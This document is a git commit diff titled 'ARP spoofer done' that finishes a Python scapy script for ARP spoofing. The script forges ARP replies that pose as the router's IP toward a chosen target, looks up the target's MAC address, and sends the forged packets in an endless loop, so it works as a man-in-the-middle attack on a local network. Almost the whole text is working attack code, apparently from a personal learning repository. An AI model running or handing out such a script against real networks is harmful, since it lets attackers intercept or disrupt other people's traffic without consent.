c58f5cc2f7ff718ad2d536ae66deee1def2f33b7
phoenixyork166 <berlinlee2017@gmail.com>
2024-02-10 00:48:35 +0800

    ARP spoofer done

--- Arp-spoofer/arp-spoofer.py
+++ Arp-spoofer/arp-spoofer.py
@@ -1,7 +1,8 @@
-import scapy
+#import scapy
+from scapy.all import *
 
 # Forging the broadcast addr
-broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
 # Browsing falsified Ethernet broadcast addr
 # broadcast.show()
 
@@ -11,9 +12,9 @@ target_IP = input('Enter target\'s IP [192.168.2.65]: ')
 # Falsifying Router's MAC address
 router_mac_addr = input('Enter preferred Router\'s MAC addr [00:50:56:fu:ck:yu]: ')
 # Entering Router's IP addr
-router_IP = input('Enter Router\'s IP [192.168.2.1]: ')
+#router_IP = input('Enter Router\'s IP [192.168.2.1]: ')
 # Crafting the ARP layer
-arp_layer = scapy.ARP(psrc=spoof_target, pdst=target_IP, hwsrc=router_mac_addr)
+arp_layer = ARP(psrc=spoof_target, pdst=target_IP, hwsrc=router_mac_addr)
 
 # Browsing arp_layer
 #arp_layer.show()
@@ -26,19 +27,26 @@ entire_packet = broadcast/arp_layer
 # Storing the answer to a variable
 # To test whether target responds
 # and we only need the response header
-answer = scapy.srp(entire_packet,timeout=2,verbose=True)[0]
+answer = srp(entire_packet,timeout=2,verbose=True)[0]
 
 # Browsing the answer
 # Target must have received => responded to your srp 
 # in order for you to view answer[0]
-print(f'answer[0]:\n{answer[0]}')
+#print(f'answer[0]:')
+#print(answer[0])
 
 # Print target's MAC address from response
-print(f'Target\'s MAC addr:\n')
-print(answer[0][1].hwsrc)
+#print(f'Target\'s MAC addr:\n')
+#print(answer[0][1].hwsrc)
 
 # Store target's MAC address to a variable
-target_mac_addr = answer[0][1].hwsrc
+# If there's NO answer
+# target's MAC address might have been spoofed
+if not answer:
+    target_mac_addr = router_mac_addr
+# If NOT spoof, use target's res MAC addr
+else:
+    target_mac_addr = answer[0][1].hwsrc
 
 # Crafting the ARP spoofing packet before sending out
 # ls(ARP) to view ARP properties
@@ -46,11 +54,14 @@ target_mac_addr = answer[0][1].hwsrc
 # hwdst => target_mac_addr
 # pdst => target's IP addr
 # psrc => spoofed address => Router's IP addr
-packet = scapy.ARP(op=2, hwdst=target_mac_addr, pdst=target_IP, psrc=router_IP)
+packet = ARP(op=2, hwdst=target_mac_addr, pdst=target_IP, psrc=spoof_target)
 
 # Browsing the packet
-packet.show()
+#packet.show()
 
 # Using an inifinite loop to send ARP spoofing packets
 while True:
-    scapy.send(packet, verbose=True)
+    try:
+        send(packet, verbose=True)
+    except ValueError as e:
+        continue
